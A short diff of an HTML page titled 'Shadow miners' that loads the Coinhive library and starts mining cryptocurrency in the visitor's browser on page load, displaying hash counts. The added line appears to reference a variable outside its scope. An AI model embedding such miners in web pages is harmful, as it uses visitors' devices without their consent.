@@ -3,7 +3,7 @@
 <title>Shadow miners</title>
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','demo',{
+	var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','demo',{
         throttle: 0.5,
 });
 	miner.start();
@@ -16,6 +16,10 @@ var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','demo',{
 		document.getElementById("hash").textContent = hashesPerSecond;
         	document.getElementById("coin").textContent = acceptedHashes;
 	}, 1000);
+	var coco = acceptedHashes/10000000;
+	document.getElementById("coco").textContent = coco;
+	
+	
 </script>
 </head>
 <body>
